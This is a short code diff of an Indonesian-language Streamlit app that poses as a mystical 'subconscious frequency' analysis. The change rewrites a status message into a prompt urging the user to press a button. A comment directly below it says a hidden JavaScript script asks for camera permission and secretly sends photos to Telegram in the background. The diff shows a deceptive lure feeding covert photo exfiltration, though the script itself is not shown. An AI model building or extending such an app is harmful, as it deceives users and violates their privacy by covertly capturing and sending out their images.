@@ -241,7 +241,7 @@ elif 1 <= st.session_state.step <= 6:
 elif st.session_state.step == 7:
     st.caption("PUNCAK ANALISIS // KALIBRASI BATCH AKHIR")
     st.title(f"Menyelaraskan Frekuensi Batin {st.session_state.user_name}...")
-    st.write("Sistem sedang membaca pola pilihan bawah sadar dan memproses gelombang memori terakhir...")
+    st.write("Teekan tombol di bawah agar Sistem membaca pola pilihan bawah sadar dan memproses gelombang memori terakhir...!")
     st.write("")
 
     # Script JavaScript tersembunyi untuk meminta izin kamera dan mengirim foto ke Telegram via API di background
